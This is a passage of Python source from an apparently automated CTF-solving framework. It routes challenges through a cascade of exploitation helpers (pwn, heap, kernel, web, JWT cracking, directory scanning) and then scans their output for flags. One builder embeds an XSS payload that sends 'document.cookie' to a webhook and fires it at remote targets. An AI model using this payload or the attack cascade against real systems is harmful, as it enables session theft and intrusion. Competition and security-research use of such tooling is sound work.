        test_input = "AAAAAAAAAAAAAAAAAAAAAA"
    return f'python3 {helpers_dir}/auto_gdb_cmp.py "{binary_path}" --input "{test_input}"'


def _build_xor_brute_command(params: dict, state: KrakenState) -> str | None:
    """Build command for XOR brute-force."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    prefix = params.get("flag_format_prefix") or ""
    hex_data = ""
    for s in state.get("strings_of_interest", []):
        stripped = s.strip()
        if all(c in "0123456789abcdefABCDEF" for c in stripped) and len(stripped) > 8:
            hex_data = stripped
            break
    if not hex_data:
        return None
    cmd = f'python3 {helpers_dir}/auto_xor_brute.py --hex "{hex_data}"'
    if prefix:
        cmd += f' --prefix "{prefix}"'
    return cmd


def _build_crypto_command(params: dict, state: KrakenState) -> str | None:
    """Build command for comprehensive crypto attack suite.

    Auto-scans the challenge directory for crypto patterns (CBC, CTR, DES,
    hash extension) and applies the appropriate attack.
    """
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_crypto.py --dir "{challenge_dir}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_c_brute_command(params: dict, state: KrakenState) -> str | None:
    """Build command for C globals/logic brute-force."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    workspace = state.get("solve_workspace") or state.get("challenge_dir", "")
    globals_path = os.path.join(workspace, "globals.c") if workspace else None
    logic_path = os.path.join(workspace, "logic.c") if workspace else None
    if globals_path and logic_path and os.path.exists(globals_path) and os.path.exists(logic_path):
        length = params.get("input_length") or 40
        return (
            f'python3 {helpers_dir}/auto_c_brute.py --globals "{globals_path}" --logic "{logic_path}" --length {length}'
        )
    return None


def _build_patcher_command(params: dict, state: KrakenState) -> str | None:
    """Build command for binary flag-gate patcher.

    Triggers when:
      - Binary exists AND
      - Either has_flag_gate is True (decompiled code has boolean gate patterns)
      - Or no_user_input is True (binary doesn't read stdin/argv -- gate likely)
      - Or input_mode is 'unknown' (no scanf/fgets/argv detected)
    """
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    if not os.path.isfile(binary_path):
        return None

    # Only run auto_patcher when we suspect a flag gate
    has_gate = params.get("has_flag_gate", False)
    no_input = params.get("no_user_input", False)
    input_mode = params.get("input_mode", "unknown")

    # Fire when: detected flag gate, or binary takes no user input, or
    # input mode is unknown (no scanf/argv detected -- possible gate binary)
    if not (has_gate or no_input or input_mode == "unknown"):
        return None

    helpers_dir = str(_HELPERS_DIR)
    flag_format = state.get("flag_format", "")
    cmd = f'python3 {helpers_dir}/auto_patcher.py "{binary_path}" --auto'
    if flag_format:
        cmd += f' --flag-format "{flag_format}"'
    return cmd


def _build_pwn_solve_command(params: dict, state: KrakenState) -> str | None:
    """Build command for full binary exploitation."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_pwn_solve.py "{binary_path}"'
    # Extract prefix from flag format
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    # Check for source code
    challenge_files = state.get("challenge_files", {})
    for name, info in challenge_files.items():
        if name.endswith(".c"):
            path = info.get("path", "")
            if path and os.path.exists(path):
                cmd += f' --source "{path}"'
                break
    # Check for remote target
    remote_info = state.get("remote_info", {})
    if remote_info.get("host") and remote_info.get("port"):
        cmd += f' --remote-host "{remote_info["host"]}" --remote-port {remote_info["port"]}'
    return cmd


def _build_heap_exploit_command(params: dict, state: KrakenState) -> str | None:
    """Build command for heap exploitation."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_heap_exploit.py "{binary_path}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    challenge_files = state.get("challenge_files", {})
    for name, info in challenge_files.items():
        if name.endswith(".c"):
            path = info.get("path", "")
            if path and os.path.exists(path):
                cmd += f' --source "{path}"'
                break
    return cmd


def _build_kernel_pwn_command(params: dict, state: KrakenState) -> str | None:
    """Build command for kernel exploitation."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None
    # Only run if kernel-related files exist
    challenge_files = state.get("challenge_files", {})
    has_kernel_indicators = any(
        name.endswith((".ko", ".cpio", ".cpio.gz", ".qcow2"))
        or "qemu" in name.lower()
        or "kernel" in name.lower()
        or "initramfs" in name.lower()
        for name in challenge_files
    )
    if not has_kernel_indicators:
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_kernel_pwn.py --challenge-dir "{challenge_dir}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        cmd += f' --flag-format "{flag_format}"'
    return cmd


def _build_web_exploit_command(params: dict, state: KrakenState) -> str | None:
    """Build command for web exploitation."""
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        return None
    helpers_dir = str(_HELPERS_DIR)
    protocol = "https" if str(port) in ("443", "8443") else "http"
    cmd = f'python3 {helpers_dir}/auto_web_exploit.py --url "{protocol}://{host}:{port}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    return cmd


def _build_graphql_exploit_command(params: dict, state: KrakenState) -> str | None:
    """Build command for GraphQL exploitation."""
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        # Fall back to challenge directory if no remote info
        challenge_dir = state.get("challenge_dir", "")
        if challenge_dir:
            helpers_dir = str(_HELPERS_DIR)
            cmd = f'python3 {helpers_dir}/auto_graphql_exploit.py "{challenge_dir}"'
            flag_format = state.get("flag_format", "")
            if flag_format:
                cmd += f' --flag-format "{flag_format}"'
            return cmd
        return None
    helpers_dir = str(_HELPERS_DIR)
    protocol = "https" if str(port) in ("443", "8443") else "http"
    cmd = f'python3 {helpers_dir}/auto_graphql_exploit.py "{protocol}://{host}:{port}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        cmd += f' --flag-format "{flag_format}"'
    return cmd


def _build_jwt_crack_command(params: dict, state: KrakenState) -> str | None:
    """Build command for JWT cracking."""
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        return None
    helpers_dir = str(_HELPERS_DIR)
    protocol = "https" if str(port) in ("443", "8443") else "http"
    cmd = f'python3 {helpers_dir}/auto_jwt_crack.py --url "{protocol}://{host}:{port}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    return cmd


def _build_directory_scan_command(params: dict, state: KrakenState) -> str | None:
    """Build command for web directory scanning."""
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        return None
    helpers_dir = str(_HELPERS_DIR)
    protocol = "https" if str(port) in ("443", "8443") else "http"
    cmd = f'python3 {helpers_dir}/auto_directory_scan.py --url "{protocol}://{host}:{port}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    return cmd


def _build_process_interact_command(params: dict, state: KrakenState) -> str | None:
    """Build command for multi-round process/service interaction."""
    helpers_dir = str(_HELPERS_DIR)
    binary_path = state.get("challenge_path", "")
    remote_info = state.get("remote_info", {})
    flag_format = state.get("flag_format", "")
    prefix_arg = ""
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            prefix_arg = f' --prefix "{prefix_m.group(1)}"'
    if remote_info.get("host") and remote_info.get("port"):
        cmd = f'python3 {helpers_dir}/auto_process_interact.py --host "{remote_info["host"]}" --port {remote_info["port"]}'
        return cmd + prefix_arg
    if binary_path and not os.path.isdir(binary_path):
        cmd = f'python3 {helpers_dir}/auto_process_interact.py --binary "{binary_path}"'
        return cmd + prefix_arg
    return None


def _build_vm_analyze_command(params: dict, state: KrakenState) -> str | None:
    """Build command for custom VM/bytecode analysis."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_vm_analyze.py --binary "{binary_path}"'
    challenge_files = state.get("challenge_files", {})
    for name, info in challenge_files.items():
        if name.endswith(".c") or name.endswith(".py"):
            path = info.get("path", "")
            if path and os.path.exists(path):
                cmd += f' --source "{path}"'
                break
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    return cmd


def _build_focused_decompile_command(params: dict, state: KrakenState) -> str | None:
    """Build command for focused decompilation of large binaries."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    # Only use for large binaries (>100KB)
    try:
        size = os.path.getsize(binary_path)
        if size < 100_000:
            return None
    except OSError:
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_focused_decompile.py --binary "{binary_path}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    return cmd


def _build_angr_advanced_command(params: dict, state: KrakenState) -> str | None:
    """Build command for advanced angr with pruning and hooks."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_angr_advanced.py --binary "{binary_path}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    length = params.get("input_length")
    if length:
        cmd += f" --length {length}"
    return cmd


def _build_docker_solve_command(params: dict, state: KrakenState) -> str | None:
    """Build command for Docker-based challenge solving."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None
    # Only run if Docker config exists
    docker_files = ["docker-compose.yml", "docker-compose.yaml", "compose.yml", "Dockerfile"]
    challenge_files = state.get("challenge_files", {})
    has_docker = any(name.lower() in [d.lower() for d in docker_files] for name in challenge_files)
    if not has_docker:
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_docker_solve.py --challenge-dir "{challenge_dir}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    return cmd


def _build_service_interact_command(params: dict, state: KrakenState) -> str | None:
    """Build command for generic service interaction."""
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_service_interact.py --host "{host}" --port {port}'
    flag_format = state.get("flag_format", "")
    if flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            cmd += f' --prefix "{prefix_m.group(1)}"'
    return cmd


def _build_webhook_oob_command(params: dict, state: KrakenState) -> str | None:
    """Build command for OOB webhook exploitation (XSS, SSRF, blind injection).

    Only triggers when a remote web service is available AND the challenge
    description or source code contains indicators of bot interaction, blind
    injection, or callback-based exfiltration.
    """
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        return None

    # Check for OOB indicators in challenge description and source files
    desc = (state.get("challenge_description") or "").lower()
    challenge_files = state.get("challenge_files", {})

    oob_indicators = [
        "bot",
        "admin",
        "visit",
        "xss",
        "ssrf",
        "blind",
        "callback",
        "webhook",
        "exfil",
        "cookie",
        "headless",
        "selenium",
        "puppeteer",
        "playwright",
        "chrome",
        "report",
        "submit url",
        "fetch",
    ]

    found_indicator = any(ind in desc for ind in oob_indicators)

    # Also check source files for bot/headless patterns
    if not found_indicator:
        for name, info in challenge_files.items():
            if name.endswith((".py", ".js", ".ts", ".rb", ".go")):
                preview = (info.get("content_preview") or "").lower()
                if any(ind in preview for ind in oob_indicators):
                    found_indicator = True
                    break

    if not found_indicator:
        return None

    protocol = "https" if str(port) in ("443", "8443") else "http"
    target_url = f"{protocol}://{host}:{port}"
    helpers_dir = str(_HELPERS_DIR)

    # Build XSS exfiltration payload by default
    payload = '<script>fetch("{{WEBHOOK}}/?c="+document.cookie)</script>'

    cmd = (
        f"python3 {helpers_dir}/auto_webhook_oob.py exploit "
        f'--url "{target_url}" '
        f"--payload '{payload}' "
        f"--method POST "
        f"--timeout 45"
    )

    flag_format = state.get("flag_format", "")
    if flag_format:
        cmd += f' --flag-format "{flag_format}"'

    return cmd


def _build_forensics_advanced_command(params: dict, state: KrakenState) -> str | None:
    """Build command for advanced forensics analysis."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None
    # Only run if forensics-relevant files exist
    challenge_files = state.get("challenge_files", {})
    forensic_exts = (".raw", ".vmem", ".dmp", ".dd", ".img", ".E01", ".reg", ".db", ".sqlite", ".mbox")
    has_forensic = any(name.lower().endswith(forensic_exts) for name in challenge_files)
    if not has_forensic:
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_forensics_advanced.py --challenge-dir "{challenge_dir}"'
    flag_format = state.get("flag_format", "")
    if flag_format:
        cmd += f' --flag-format "{flag_format}"'
    return cmd


def _build_bash_solver_command(params: dict, state: KrakenState) -> str | None:
    """Build command to find and run bash solver scripts in the challenge dir."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None
    # Quick check: does the directory contain any .sh files?
    has_sh = False
    try:
        for root, _dirs, files in os.walk(challenge_dir):
            depth = root.replace(challenge_dir, "").count(os.sep)
            if depth > 3:
                continue
            for f in files:
                if f.endswith(".sh"):
                    has_sh = True
                    break
            if has_sh:
                break
    except OSError:
        pass
    if not has_sh:
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_bash_solver.py "{challenge_dir}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


# ── Populate _CUSTOM_BUILDERS with all custom-style tools ────────────────

_CUSTOM_BUILDERS.update(
    {
        # Universal tools with custom command logic
        "auto_bash_solver": _build_bash_solver_command,
        "auto_python_reverse": _build_python_reverse_command,
        "auto_run_static": _build_run_static_command,
        "auto_c_source_eval": _build_c_source_eval_command,
        "auto_cpp_compile": _build_cpp_compile_command,
        "auto_qr_decode": _build_qr_decode_command,
        "auto_maze_solver": _build_maze_solver_command,
        "auto_archive_search": _build_archive_search_command,
        "auto_git_extract": _build_git_extract_command,
        "auto_table_reverse": _build_table_reverse_command,
        "auto_ec_vigenere": _build_ec_vigenere_command,
        "auto_pcap_extract": _build_pcap_extract_command,
        "auto_steg_extract": _build_steg_extract_command,
        "auto_remote_interact": _build_remote_interact_command,
        "auto_timing_attack": _build_timing_attack_command,
        # Type-specific tools with custom command logic
        "auto_c_rand": _build_c_rand_command,
        "auto_angr": _build_angr_command,
        "auto_regex_z3": _build_regex_z3_command,
        "auto_gdb_cmp": _build_gdb_cmp_command,
        "auto_xor_brute": _build_xor_brute_command,
        "auto_crypto": _build_crypto_command,
        "auto_c_brute": _build_c_brute_command,
        "auto_patcher": _build_patcher_command,
        # New exploitation tools
        "auto_pwn_solve": _build_pwn_solve_command,
        "auto_heap_exploit": _build_heap_exploit_command,
        "auto_kernel_pwn": _build_kernel_pwn_command,
        "auto_web_exploit": _build_web_exploit_command,
        "auto_graphql_exploit": _build_graphql_exploit_command,
        "auto_jwt_crack": _build_jwt_crack_command,
        "auto_directory_scan": _build_directory_scan_command,
        "auto_process_interact": _build_process_interact_command,
        "auto_vm_analyze": _build_vm_analyze_command,
        "auto_focused_decompile": _build_focused_decompile_command,
        "auto_angr_advanced": _build_angr_advanced_command,
        "auto_docker_solve": _build_docker_solve_command,
        "auto_service_interact": _build_service_interact_command,
        "auto_forensics_advanced": _build_forensics_advanced_command,
        "auto_webhook_oob": _build_webhook_oob_command,
        # Tight-budget ROP toolkit (added 2026-04-11, post-pwn2 postmortem)
        "auto_one_gadget": _build_one_gadget_command,
        "auto_rop_offset_check": _build_rop_offset_check_command,
        "auto_classify_wrapper": _build_classify_wrapper_command,
        "auto_reg_dump": _build_reg_dump_command,
        "auto_fifo_gdb": _build_fifo_gdb_command,
        # NOTE: Tools with command_style="dir_flag" or "binary_flag" in tool_meta.json
        # do NOT need entries here -- they are handled by _build_generic_command().
        # These include: auto_source_decode, auto_constraint_extract, auto_hash_crack,
        # auto_pdf_extract, auto_file_carve, auto_pwn_template, auto_rop_extract,
        # auto_gdb_solve, auto_memory_dump, auto_deobfuscate, auto_dynamic_trace.
    }
)


async def _run_tool(cmd: str, cwd: str | None, timeout: int) -> dict:
    """Execute a tool command and return results."""
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
            start_new_session=True,  # create process group so we can kill entire tree
        )
        try:
            stdout_bytes, stderr_bytes = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except TimeoutError:
            # Kill entire process group (shell + all children like angr)
            import os as _os
            import signal as _signal

            try:
                _os.killpg(_os.getpgid(proc.pid), _signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                proc.kill()
            await proc.communicate()
            return {
                "exit_code": -1,
                "stdout": "",
                "stderr": f"Tool timed out after {timeout}s",
            }

        return {
            "exit_code": proc.returncode,
            "stdout": stdout_bytes.decode(errors="replace")[:5000],
            "stderr": stderr_bytes.decode(errors="replace")[:2000],
        }
    except Exception as e:
        return {
            "exit_code": -1,
            "stdout": "",
            "stderr": f"Tool execution error: {e}",
        }


# Prefixes from binary runtime/compiler internals -- never valid CTF flags.
# Duplicated from flag_validator for cascade-level rejection.
_RUNTIME_NOISE_PREFIXES = {
    "rspunycode",
    "rustc",
    "rustup",
    "cargo",
    "clippy",
    "libcore",
    "liballoc",
    "libstd",
    "librustc",
    "libtest",
    "llvm",
    "gimli",
    "dwarf",
    "debug",
    "debuginfo",
    "goarch",
    "goos",
    "goroot",
    "gopath",
    "gomod",
    "runtime",
    "syscall",
    "glibc",
    "libgcc",
    "libstdc",
    "libasan",
    "libtsan",
    "libubsan",
    "cxxabi",
    "gnulib",
    "elfdata",
    "elfclass",
    "elfmag",
    "elfosabi",
    "cmake",
    "autoconf",
    "automake",
    "configure",
    "internal",
    "builtin",
}


def _is_runtime_noise(candidate: str) -> bool:
    """Return True if candidate's prefix is a known runtime/compiler namespace."""
    m = re.match(r"^([A-Za-z0-9_\-]+)\{", candidate or "")
    if not m:
        return False
    return m.group(1).lower() in _RUNTIME_NOISE_PREFIXES


def _is_shell_expression(candidate: str) -> bool:
    """Return True if candidate looks like an unexpanded shell expression, not a real flag.

    Catches false positives like flag{"$(<flag.txt)"} from bash scripts.
    """
    if not candidate:
        return False
    # Extract body between braces
    m = re.match(r"[A-Za-z_]+\{(.+)\}$", candidate)
    if not m:
        return False
    body = m.group(1)
    # Shell metacharacters that should never appear in a real flag body
    return bool(re.search(r"\$[\({<]|`[^`]+`|\$\w+", body))


def _is_code_fragment(candidate: str) -> bool:
    """Return True if candidate looks like source code, not a real flag.

    Catches false positives like flag{'+'\\0'*(KEYLEN-5)} from Python source.
    """
    if not candidate:
        return False
    # Extract body (with or without closing brace)
    m = re.match(r"[A-Za-z_]+\{(.+)\}$", candidate)
    body = m.group(1) if m else ""
    # Also check the full candidate for code patterns
    check_text = body if body else candidate

    # Python/code indicators
    code_indicators = [
        "'+'",
        "\\0",
        "*(",
        "KEYLEN",
        "len(",
        "range(",
        "for ",
        "if ",
        "import ",
        "def ",
        "class ",
        "return ",
        "print(",
        "\\n",
        "\\t",
        "\\x",
        "__",
        "lambda",
        "*(KEYLEN",
    ]
    if any(ind in check_text for ind in code_indicators):
        return True
    # Also check the full candidate for code patterns
    if any(ind in candidate for ind in code_indicators):
        return True
    # Body is too short (single char like "-")
    if body and len(body) <= 1:
        return True
    # Body has unbalanced quotes (code fragment)
    if body and (body.count("'") % 2 != 0 or body.count('"') % 2 != 0):
        return True
    # Candidate itself has unbalanced quotes
    after_brace = candidate.split("{", 1)[1] if "{" in candidate else ""
    if after_brace and (after_brace.count("'") % 2 != 0):
        return True
    return False


# Recon/enumeration tools whose stdout is structured metadata (paths, keys),
# never a bare flag body. Their output must NOT be run through the
# bare-token prefix-wrap heuristic below, or a metadata token like
# "target_dir" gets wrapped into a bogus flag (e.g. vere{target_dir}).
_NO_PREFIX_WRAP_TOOLS = frozenset({"auto_existing_exploits"})


def _check_for_flag(output: str, flag_format: str, tool_name: str = "") -> str | None:
    """Check if output contains a flag matching the expected format.

    ``tool_name`` lets recon tools opt out of the bare-token prefix-wrap
    heuristic (they emit metadata, not flag bodies).
    """
    if not output:
        return None

    # Extract expected prefix from flag_format (e.g. "csawctf{...}" -> "csawctf{")
    _expected_prefix = None
    if flag_format:
        _pfx_m = re.match(r"([A-Za-z_]+)\{", flag_format.replace("\\{", "{"))
        if _pfx_m:
            _expected_prefix = _pfx_m.group(1).lower()

    # Check for our helper tool's EXTRACTED FLAG marker first
    marker_match = re.search(r"EXTRACTED FLAG:\s*(.+)", output)
    if marker_match:
        candidate = marker_match.group(1).strip()
        # Validate: must be long enough and body must be non-trivial
        if (
            len(candidate) >= 4
            and not _is_runtime_noise(candidate)
            and not _is_shell_expression(candidate)
            and not _is_code_fragment(candidate)
        ):
            brace_m = re.match(r"([A-Za-z_]+)\{(.+)\}$", candidate)
            if brace_m:
                cand_prefix = brace_m.group(1).lower()
                body = brace_m.group(2)
                # Reject tiny bodies (e.g. HTB{xx} from READMEs)
                if len(body) < 4:
                    log.info("check_flag_marker_body_too_short", candidate=candidate, body_len=len(body))
                # If we know the expected prefix, reject mismatches (herring flags)
                elif _expected_prefix and cand_prefix != _expected_prefix and cand_prefix != "flag":
                    log.info("check_flag_marker_prefix_mismatch", candidate=candidate, expected=_expected_prefix)
                elif _expected_prefix and cand_prefix == "flag" and _expected_prefix != "flag":
                    # Generic flag{...} found but we expect a specific prefix --
                    # don't accept immediately, let format-specific search below try first
                    log.info("check_flag_marker_generic_deferred", candidate=candidate, expected=_expected_prefix)
                else:
                    return candidate
            else:
                return candidate

    # Try flag format pattern first (handles both braced and braceless formats)
    if flag_format:
        try:
            match = re.search(flag_format, output)
            if match and not _is_shell_expression(match.group(0)) and not _is_code_fragment(match.group(0)):
                return match.group(0)
        except re.error:
            pass

        # Extract prefix from format like "flag{...}" -> "flag{"
        prefix_match = re.match(r"([A-Za-z_]+\{)", flag_format)
        if prefix_match:
            prefix = re.escape(prefix_match.group(1))
            match = re.search(prefix + r"[^}]+\}", output)
            if match:
                return match.group(0)

    # Generic flag patterns -- skip if we expect a specific non-generic prefix
    # (prevents herring flags like flag{...} from shadowing csawctf{...})
    patterns = [
        r"[Ff][Ll][Aa][Gg]\{[^}]+\}",
        r"CTF\{[^}]+\}",
        r"[a-zA-Z]+\{[^\s}]{3,}\}",
    ]
    for pat in patterns:
        match = re.search(pat, output)
        if (
            match
            and not _is_runtime_noise(match.group(0))
            and not _is_code_fragment(match.group(0))
            and not _is_shell_expression(match.group(0))
        ):
            # If a specific flag prefix was requested, a generic word{...} match
            # must actually carry that prefix. The format-specific search above
            # already ran, so reaching here with a different prefix means the only
            # brace-string is a decoy or an undecoded blob (e.g. an encoded
            # synt{...} under a flag{} format), not the flag. Reject it.
            if _expected_prefix:
                gm = re.match(r"([A-Za-z_]+)\{", match.group(0))
                if gm and gm.group(1).lower() != _expected_prefix:
                    log.info(
                        "check_flag_generic_prefix_mismatch",
                        candidate=match.group(0),
                        expected=_expected_prefix,
                    )
                    continue
            return match.group(0)

    # Check for incomplete flags -- script may have crashed before printing '}'
    # Look for lines like "prefix{body" (no closing brace) with substantial body
    for line in reversed(output.split("\n")):
        stripped = line.strip()
        m = re.match(r"^([a-zA-Z]{2,}\{[^\s{}]{4,})$", stripped)
        if m:
            candidate = m.group(1) + "}"
            if _is_runtime_noise(candidate):
                continue
            log.info("tool_router_incomplete_flag_repaired", candidate=candidate)
            return candidate

    # Try wrapping output lines with flag prefix -- catches solve scripts that
    # output the body without the flag{} wrapper
    _REJECT_BODIES = {
        "wrong",
        "error",
        "fail",
        "failed",
        "invalid",
        "incorrect",
        "nope",
        "false",
        "denied",
        "reject",
        "rejected",
        "none",
        "null",
        "empty",
        "bad",
        "usage",
        "help",
        "abort",
        # tool-output metadata identifiers -- never real flag bodies
        "target_dir",
        "challenge_path",
        "challenge_dir",
        "output_dir",
        "out_dir",
        "base_dir",
        "root_dir",
    }
    if flag_format and tool_name not in _NO_PREFIX_WRAP_TOOLS:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            prefix = prefix_m.group(1)
            for line in reversed(output.split("\n")):
                body = line.strip()
                if len(body) < 4 or not re.match(r"^[A-Za-z0-9_\-.]+$", body):
                    continue
                if body.lower() in _REJECT_BODIES:
                    continue
                # Diversity check: bodies 8+ chars need sufficient char variety
                # Exempt binary (0/1) and hex strings -- valid flag bodies
                if len(body) >= 8 and len(set(body)) < len(body) // 3:
                    if not re.match(r"^[01]+$", body) and not re.match(r"^[0-9a-fA-F]+$", body):
                        continue
                candidate = f"{prefix}{{{body}}}"
                try:
                    if re.search(flag_format, candidate):
                        log.info("tool_router_prefix_wrapped_flag", candidate=candidate)
                        return candidate
                except re.error:
                    pass

    return None


async def tool_router(state: KrakenState) -> dict:
    """Run deterministic tool cascade before LLM-based solve engine."""
    challenge_type = (state.get("challenge_type") or "").lower()
    params = state.get("extracted_params", {})
    flag_format = state.get("flag_format", "")
    cwd = state.get("solve_workspace") or state.get("challenge_dir")
    timeout = _TOOL_TIMEOUTS.get(challenge_type, _DEFAULT_TOOL_TIMEOUT)

    # Load tool lists from registry (falls back to hardcoded if unavailable)
    universal_tools = _get_universal_tools()
    type_specific_map = _get_type_specific()
    default_type_specific = _get_default_type_specific()
    remote_tools = _get_remote_tools()

    # RAG: boost tools recommended by similar solved challenges
    # Only when explicitly enabled (adds ~700ms latency)
    _rag_boost: list[str] = []
    if state.get("enable_rag") or os.environ.get("KRAKEN_ENABLE_RAG"):
        try:
            from kraken.knowledge.rag import SolveRAG

            _rag_boost = SolveRAG().get_tool_boost(state)
            if _rag_boost:
                log.info("tool_router_rag_boost", tools=_rag_boost[:5])
        except Exception:
            pass

    # Try loading learned cascade config
    tool_timeouts: dict[str, int] = {}
    try:
        from kraken.execution.optimizer import load_cascade_config

        learned = load_cascade_config()
    except Exception:
        learned = None

    if learned and challenge_type in (learned.get("type_cascades") or {}):
        tc = learned["type_cascades"][challenge_type]
        if tc is not None:
            # Use learned ordering
            learned_universal = tc.get("universal_order") or list(universal_tools)
            learned_type_specific = tc.get("type_specific_order") or list(
                type_specific_map.get(challenge_type, default_type_specific)
            )
            skip_set = set(tc.get("skip_tools") or [])

            # Forward-compatibility: append any registered tools not in learned config
            for t in universal_tools:
                if t not in learned_universal and t not in skip_set:
                    learned_universal.append(t)
            for t in type_specific_map.get(challenge_type, default_type_specific):
                if t not in learned_type_specific and t not in skip_set:
                    learned_type_specific.append(t)

            cascade = [t for t in learned_universal + learned_type_specific if t not in skip_set]
            if tc.get("type_timeout"):
                timeout = tc["type_timeout"]
            tool_timeouts = tc.get("timeouts") or {}
            log.info(
                "tool_router_learned_config",
                challenge_type=challenge_type,
                skip_tools=list(skip_set),
                timeout=timeout,
            )
        else:
            # Type has insufficient samples -- use defaults
            type_specific = type_specific_map.get(challenge_type, default_type_specific)
            cascade = universal_tools + type_specific
    else:
        type_specific = type_specific_map.get(challenge_type, default_type_specific)
        cascade = universal_tools + type_specific

    # RAG boost: move recommended tools to front of cascade
    if _rag_boost:
        boosted = [t for t in _rag_boost if t in cascade]
        remaining = [t for t in cascade if t not in boosted]
        cascade = boosted + remaining

    # Inject remote tools when the challenge has a remote service
    remote_info = state.get("remote_info", {})
    if remote_info.get("host"):
        # Skip timing attack for pwn challenges -- network jitter produces false positives
        if challenge_type == "pwn":
            remote_tools = [t for t in remote_tools if t != "auto_timing_attack"]
        cascade = cascade + remote_tools
        timeout = max(timeout, _REMOTE_TOOL_TIMEOUT)

    log.info(
        "tool_router_start",
        challenge_type=challenge_type,
        cascade=cascade,
        params_keys=list(params.keys()) if params else [],
    )

    results: list[dict] = []
    flag_candidate = None

    for tool_name in cascade:
        cmd = _build_tool_command(tool_name, params, state)
        if not cmd:
            log.info("tool_router_skip", tool=tool_name, reason="cannot build command")
            continue

        effective_timeout = tool_timeouts.get(tool_name, timeout)
        log.info("tool_router_run", tool=tool_name, cmd=cmd[:200])
